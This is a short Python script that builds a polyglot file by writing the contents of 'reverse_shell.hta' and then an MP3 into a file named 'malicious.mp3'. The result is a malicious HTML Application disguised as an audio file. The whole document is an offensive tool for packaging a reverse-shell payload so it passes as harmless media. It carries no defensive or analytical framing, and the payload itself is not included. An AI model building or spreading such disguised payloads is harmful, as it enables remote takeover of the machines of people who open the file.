# build_polyglot_mp3.py
hta = open("reverse_shell.hta", "rb").read()
mp3 = open("You_Have_Been_Hacked.mp3", "rb").read()

with open("malicious.mp3", "wb") as f:
    f.write(hta)
    f.write(mp3)
